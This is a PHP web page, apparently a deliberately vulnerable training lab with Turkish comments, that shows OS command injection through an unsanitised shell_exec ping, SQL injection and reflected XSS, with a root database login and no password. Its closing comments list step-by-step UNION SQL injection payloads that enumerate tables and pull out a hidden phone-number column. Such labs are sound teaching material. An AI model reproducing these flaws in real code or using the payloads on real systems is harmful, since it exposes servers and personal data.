<?php
//SQL bağlantısının açılışı

                // Bilgiler
                $servername = "localhost";
                $username = "root";
                $password = "";
                $dbname = "BTK";

                // Veritabanına bağlantı kurma
                $conn = new mysqli($servername, $username, $password, $dbname);

                // Bağlantıyı kontrol etme
                if ($conn->connect_error) {
                    die("Veritabanına bağlanılamadı: " . $conn->connect_error);
                }
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INJECTION</title>
    <link rel="stylesheet" href="dataDesign.css">
</head>
<body>
    <div class="form-container">
        <div class="form-header">
            <h2>INJECTION</h2>
        </div>
        <form id="myForm" method="POST">
            <div class="form-group">
                <label for="input1">OS INJECT: </label>
                <input type="text" id="input1" name="input1" placeholder="Ping atmak istediğiniz IP'yi giriniz.">
            </div>
            <div class="form-group">
                <label for="input2">SQL INJECT: </label>
                <input type="text" id="input2" name="input2" placeholder="Personel adını giriniz.">
            </div>
            <div class="form-group">
                <label for="input3">XSS INJECT: </label>
                <input type="text" id="input3" name="input3" placeholder="Çıktı olarak istediğiniz düzyazıyı giriniz.">
            </div>
            <button type="submit">GO!</button>
        </form>
        <div>
            <label id="label1">

                <?php //XSS'i sağlayan ve inputların kontrolünü sağlayan yer.
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    $input1 = isset($_POST['input1']) ? htmlspecialchars($_POST['input1']) : '';
                    $input2 = isset($_POST['input2']) ? htmlspecialchars($_POST['input2']) : '';
                    $input3 = isset($_POST['input3']) ? ($_POST['input3']) : '';


                    if ($input1) {    // Ping işleminin ve OS injection yapıldığı yer.
                         $pingResult = shell_exec("ping -c 4 " . ($input1));
                         if ($pingResult == null){
                            echo "Lütfen geçerli bir IP adresi giriniz!";
                         }else {
                            echo "OS INJECT (Ping Sonuçları): <br><pre>" . ($pingResult) . "</pre>";//OS inject 
                         }
                         
                    }
                    elseif ($input2) { //SQL sorgusu ve SQL injection yapıldığı yer.
                        $sql = "SELECT * FROM Personel WHERE ad = '$input2'";
                        $result = $conn->query($sql);
                        if ($result->num_rows > 0) {
                            while ($row = $result->fetch_assoc()) {
                                echo "<br>";
                                echo "ID: " . $row["id"] . "<br>";
                                echo "Ad: " . $row["ad"] . "<br>";
                                echo "Soyad: " . $row["soyad"] . "<br>";
                                echo "Eposta: " . $row["eposta"] . "<br>";
                                echo "Pozisyon: " . $row["pozisyon"] . "<br>";
                                echo "Departman No: " . $row["departman_id"] . "<br>";
                                echo "İşe giriş tarihi: " . $row["ise_alim_tarihi"] . "<br>";
                                //echo "GSM: " . $row["telefon"] . "<br><br>";
                            }
                        } else {
                            echo "Bu isimde bir personel bulunamadı.";
                        }
                        
                    } 
                    elseif ($input3) {    // XSS injection yapıldığı yeri
                        echo "XSS INJECT: $input3"; 
                    } 
                    else {
                        echo "Henüz bir değer girilmedi!";
                    }
                }

                ?>

            </label>
        </div>
    </div>
</body>
</html>


<?php
$conn->close(); 
// ' OR 1=1 -- - ->Verileri getirir.
// 'ORDER BY 9 -- -> yazdığımızda sütun sayısını bulma fonksiyonu 9 yazdığımızda hata alıyoruz çünkü 8 tane sütun var 8 yazdığımızda içerde olduğumuzu anlıyoruz.
// 'OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8 -- - yazdığımızda bütün verilerin en altında  hangi sütunların ekrana basıldığını anlayabiliriz.
// 'OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8 -- - yazdığımızda ise bir tek hangi verilerin bastırıldığını öğreniriz.
// 'OR 1=2 UNION SELECT @@version_compile_os,2,database(),version(),5,6,7,8 -- - yazarak belli istediğimiz bilgileri herhangi bir tablo kullanmadan öğrenebiliriz.
// 'OR 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 from information_schema.tables -- - yazdığımızda veritabanındaki bütün tabloların ismini çekeriz ve bu çektiğimiz veriyi 1.sütunun yazıldığo yere yazarız.
// 'OR 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 from information_schema.tables where table_schema = database() -- - kodu mevcut databasedeki bütün tabloları getirmeyi sağlar böylece diğer tabloların isimlerini çekmemiş oluruz.
// 'OR 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_name = 'Personel' -- - kodu Personel tablosundaki sütun isimlerini getirir.
// ve bu aşamadan sonra diğer tablolara, tablolardaki satırlara ulaşabildiğimiz için ekrana basılmayan telefon adlı sütunu bastıralım;
// 'OR 1=2 UNION SELECT telefon,2,3,4,5,6,7,8 from Personel -- - 


?> 